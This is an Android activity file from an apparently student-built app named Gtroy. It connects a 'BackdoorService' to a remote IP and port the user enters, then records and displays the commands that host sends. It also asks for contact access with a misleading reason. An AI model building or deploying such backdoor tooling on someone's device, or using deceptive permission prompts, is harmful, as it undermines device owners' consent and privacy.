package id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

import android.widget.Toast;

import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.databinding.ActivityMainBinding;
import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.fragments.CommandHistoryFragment;
import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.fragments.KnownHostFragment;
import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.fragments.LoginHistoryFragment;
import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.services.BackdoorService;
import id.ac.ui.cs.mobileprogramming.gregoriusaprisunnea.gtroy.viewModels.MainActivityViewModel;

public class MainActivity extends AppCompatActivity {
    MainActivityViewModel mainActivityViewModel;
    private ActivityMainBinding binding;
    private boolean isConnected;
    BackdoorService backdoorService;
    private boolean wideScreen;

    private WifiManager wifiManager;

    int ACCESS_NETWORK_STATE_PERMISSION_CODE = 10;
    int INTERNET_PERMISSION_CODE = 20;
    int READ_CONTACT_PERMISSION_CODE = 30;

    private BroadcastReceiver br = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String type = intent.getStringExtra(BackdoorService.TYPE);
            String value = intent.getStringExtra(BackdoorService.BROADCAST_VALUE);
            if(type.equals(BackdoorService.TYPE_CONNECTION)) {
                connectionBRHandler(Boolean.parseBoolean(value));
            } else if (type.equals(BackdoorService.TYPE_COMMAND)) {
                commandBRHandler(value);
            }
        }
    };

    NotificationManager notificationManager;
    String notificationChannelId = "Gtroy";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkPermission(Manifest.permission.INTERNET, INTERNET_PERMISSION_CODE);
        checkPermission(Manifest.permission.ACCESS_NETWORK_STATE, ACCESS_NETWORK_STATE_PERMISSION_CODE);
        checkPermission(Manifest.permission.READ_CONTACTS, READ_CONTACT_PERMISSION_CODE);

        // view binding
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        mainActivityViewModel = MainActivityViewModel.getInstance(MainActivity.this);

        wideScreen = (findViewById(R.id.container) == null);
        if(! wideScreen) {
            if (savedInstanceState == null) {
                mainActivityViewModel.addLoginHistory();
                getSupportFragmentManager().beginTransaction().
                        replace(R.id.container, new LoginHistoryFragment()).
                        commit();
            }
            binding.connectButton.setOnClickListener(connectButtonClickHandler);
            binding.commandHistoryButton.setOnClickListener(commandHistoryButtonClickHandler);
            binding.KnownHostButton.setOnClickListener(knownHistoryButtonClickHandler);
            binding.loginHistoryButton.setOnClickListener(loginHistoryButtonClickHandler);
            binding.startOpenGLButton.setOnClickListener(startOpenGLButtonOnClickHandler);

        }
        else {
            if (savedInstanceState == null) {
                mainActivityViewModel.addLoginHistory();
                getSupportFragmentManager().beginTransaction().
                        replace(R.id.containerLoginHistory, new LoginHistoryFragment()).
                        replace(R.id.containerCommandHistory, new CommandHistoryFragment()).
                        replace(R.id.containerKnownHost, new KnownHostFragment()).
                        commit();
            }
            binding.connectButton.setOnClickListener(connectButtonClickHandler);
        }
        // Managers
        wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        // wifi status
        String wifi_status = "Wifi is disabled";
        if (wifiManager.isWifiEnabled()) {
            wifi_status = "Wifi is enabled";
        }
        binding.wifiStatusTextView.setText(wifi_status);


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
        {
            NotificationChannel channel = new NotificationChannel(
                    notificationChannelId,
                    "Channel human readable title",
                    NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(channel);
        }
    }

    @Override
    protected void onDestroy() {
        stopService(new Intent(this, BackdoorService.class));
        super.onDestroy();
    }

    private View.OnClickListener connectButtonClickHandler = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            backdoorService = BackdoorService.getInstance();
            if(isConnected) {
                stopService(new Intent(MainActivity.this, backdoorService.getClass()));
                unregisterReceiver(br);
                connectionBRHandler(false);
                return;
            } else {
                Intent backdoorServiceIntent = new Intent(MainActivity.this, backdoorService.getClass());
                String ip = String.valueOf(binding.ipv4EditText.getText());
                String port = String.valueOf(binding.portNumberEditText.getText());
                backdoorServiceIntent.putExtra("ip", ip);
                backdoorServiceIntent.putExtra("port", port);
                startService(backdoorServiceIntent);
                registerReceiver(br, new IntentFilter(BackdoorService.BACKDOOR_BR));
                mainActivityViewModel.addKnownHost(ip, port);
            }

        }
    };

    private View.OnClickListener commandHistoryButtonClickHandler = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            openFragment(new CommandHistoryFragment(), false);
        }
    };

    private View.OnClickListener loginHistoryButtonClickHandler = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            openFragment(new LoginHistoryFragment(), false);
        }
    };

    private View.OnClickListener knownHistoryButtonClickHandler = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            openFragment(new KnownHostFragment(), false);
        }
    };

    private View.OnClickListener startOpenGLButtonOnClickHandler = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Intent i = new Intent(getApplicationContext(), OpenGLActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            getApplicationContext().startActivity(i);
        }
    };

    private void openFragment(Fragment fragment, boolean back_stack) {
        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
        transaction.setCustomAnimations(android.R.animator.fade_in, android.R.animator.fade_out);
        transaction.replace(R.id.container, fragment);
        if (back_stack) {
            transaction.addToBackStack(null);
        }
        transaction.commit();
    }

    public boolean checkPermission(String permission, int requestCode) {
        Activity activity = (Activity) this;
        boolean have_access = true;
        if (activity.checkSelfPermission(permission) == PackageManager.PERMISSION_DENIED) {
            have_access = false;
            activity.requestPermissions(new String[] { permission }, requestCode);
        }
        return have_access;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == INTERNET_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            }
        } else if (requestCode == ACCESS_NETWORK_STATE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            }
        } else if (requestCode == READ_CONTACT_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            } else {
                dialogContact();
            }
        }
    }

    private void connectionBRHandler(boolean brIsConnected) {
        registerReceiver(br, new IntentFilter(BackdoorService.BACKDOOR_BR));
        isConnected = brIsConnected;
            if(isConnected) {
                binding.connectButton.setText(R.string.connectButtonDisconnectedText);
            } else {
                binding.connectButton.setText(R.string.connectButtonConnectedText);
            }
    }

    private void commandBRHandler(String command) {
        Toast.makeText(MainActivity.this,R.string.prefixToastOnCommandReceived + command, Toast.LENGTH_SHORT);
        if (command != null && !command.equals("") && isConnected) {
            mainActivityViewModel.addCommandHistory(command);

            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(getApplicationContext());
            notificationBuilder.setContentTitle("Gtroy")
                    .setChannelId(notificationChannelId)
                    .setContentText("received command: " + command)
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setAutoCancel(true);
            notificationManager.notify(0, notificationBuilder.build());
        }
    }

    public void dialogContact() {
        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage("We can't read contacts, do you want to give us permission?")
                .setCancelable(false)
                .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                    public void onClick(@SuppressWarnings("unused") final DialogInterface dialog, @SuppressWarnings("unused") final int id) {
                        checkPermission(Manifest.permission.READ_CONTACTS, READ_CONTACT_PERMISSION_CODE);
                    }
                })
                .setNegativeButton("No", new DialogInterface.OnClickListener() {
                    public void onClick(final DialogInterface dialog, @SuppressWarnings("unused") final int id) {
                        Toast. makeText(getApplicationContext(),"We need contact permission in order to run background services",Toast. LENGTH_LONG).show();
                        dialog.dismiss();
                        Intent i = new Intent(getApplicationContext(), PermissionDescriptionActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        getApplicationContext().startActivity(i);
                    }
                });
        final AlertDialog alert = builder.create();
        alert.show();
    }

}

